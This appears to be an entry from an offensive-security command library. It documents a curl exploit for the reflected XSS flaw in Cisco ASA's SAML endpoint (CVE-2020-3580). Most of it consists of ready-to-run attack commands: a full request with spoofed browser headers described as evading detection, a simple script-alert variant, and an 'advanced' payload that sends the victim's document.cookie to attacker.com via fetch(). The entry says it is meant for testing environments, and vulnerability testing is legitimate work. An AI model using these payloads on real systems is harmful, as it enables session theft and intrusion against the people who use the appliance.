---
id: 123e4567-e89b-12d3-a456-426614174002
name: send-malicious-post-to-cisco-asa-saml
type: command
executor: bash
data: >-
  curl -X POST "https://target.example.com/+CSCOE+/saml/sp/acs?tgname=a" -H
  "Host: target.example.com" -H "Connection: close" -H "sec-ch-ua: \" Not;A
  Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\" " -H
  "sec-ch-ua-mobile: ?0" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
  Gecko) Chrome/91.0.4472.114 Safari/537.36" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
  */*;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Sec-Fetch-Site: none" -H
  "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-User: ?1" -H "Sec-Fetch-Dest:
  document" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language:
  en-US,en;q=0.9" -H "Content-Length: 40" -d
  'SAMLResponse=\"><svg/onload=alert(\'xss\')>'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:25.983Z'
platforms:
  - Web
tags:
  - xss
  - post-request
verified: false
validated: true
submitted: true
---

# send-malicious-post-to-cisco-asa-saml

## Command

```bash
curl -X POST "https://target.example.com/+CSCOE+/saml/sp/acs?tgname=a" \
  -H "Host: target.example.com" \
  -H "Connection: close" \
  -H "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\" " \
  -H "sec-ch-ua-mobile: ?0" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng, */*;q=0.8,application/signed-exchange;v=b3;q=0.9" \
  -H "Sec-Fetch-Site: none" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-User: ?1" \
  -H "Sec-Fetch-Dest: document" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Content-Length: 40" \
  -d 'SAMLResponse=\"><svg/onload=alert(\'xss\')>'
```

## Description

This command sends a crafted HTTP POST request to the Cisco ASA SAML endpoint to exploit the reflected XSS vulnerability (CVE-2020-3580). It injects a JavaScript payload via the SAMLResponse parameter, which is reflected and executed in the browser. Use this in testing environments to verify the vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://target.example.com/+CSCOE+/saml/sp/acs?tgname=a` | The target SAML endpoint URL with tunnel group parameter | Yes |
| `-H "Host: target.example.com"` | Sets the Host header to the target domain | Yes |
| `-d 'SAMLResponse=\"><svg/onload=alert(\'xss\')>'` | The payload data with XSS injection | Yes |
| Various `-H` headers | Mimic browser headers to evade basic detection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://target.example.com/+CSCOE+/saml/sp/acs?tgname=a" -H "Content-Type: application/x-www-form-urlencoded" -d 'SAMLResponse=\"><script>alert(\'xss\')</script>'
```

### Advanced Usage

```bash
curl -X POST "https://target.example.com/+CSCOE+/saml/sp/acs?tgname=a" -H "User-Agent: Mozilla/5.0 ..." -H "Cookie: session=abc123" -d 'SAMLResponse=\"><svg/onload=fetch(\'http://attacker.com/steal?cookie=\' + document.cookie)>' --verbose
```

## Expected Output

The command returns the HTTP response from the server, which includes the reflected payload in the HTML body. If vulnerable, viewing the response in a browser will execute the JavaScript, showing an alert('xss') or sending data to an attacker server. Look for status 200 and unsanitized payload in the response body.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-Cisco-ASA-SAML]]
